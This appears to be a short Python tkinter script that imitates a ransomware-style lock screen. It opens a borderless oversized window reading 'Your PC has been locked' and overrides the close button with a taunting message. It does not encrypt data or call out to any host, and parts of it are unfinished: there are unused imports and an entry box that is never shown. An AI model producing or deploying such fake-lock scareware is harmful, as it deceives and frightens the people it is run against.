import imp
import tkinter as tk
from tkinter import *
from tkinter import ttk
from turtle import textinput

root = tk.Tk()
root.overrideredirect(1)
root.geometry('1100x1100')
def on_closing():
    print('Lol u cant close me')
    pass

Label(root, text='Your PC has been locked').pack()
entry_1 = ttk.Entry(root, width=10, show='')
root.protocol("WM_DELETE_WINDOW", on_closing)
root.mainloop()